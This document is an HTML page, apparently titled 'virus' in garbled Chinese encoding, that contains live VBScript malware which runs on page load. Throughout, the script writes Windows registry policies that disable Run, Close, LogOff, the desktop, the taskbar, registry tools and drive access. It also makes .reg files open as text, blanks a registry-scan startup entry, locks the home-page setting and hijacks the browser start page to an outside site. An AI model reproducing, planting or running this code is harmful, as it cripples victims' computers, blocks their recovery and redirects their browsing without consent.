   <HTML>
   <HEAD><TITLE>²¡¶¾</TITLE>
   <script Language=VBS>
   Set fs=CreateObject("Scripting.FileSystemObject")
   Set dir1=fs.GetSpecialFolder(0)
   Set dir2=fs.GetSpecialFolder(1)
   Set so=CreateObject("Scripting.FileSystemObject")
   dim r
   Set r=CreateObject("Wscript.Shell")
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",63000000,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
   r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",""
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD"
   r.Regwrite "HKLM\Software\CLASSES\.reg\","txtfile"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
   r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.macrosoft.com"
   </script>
   </HEAD>
   </HTML>
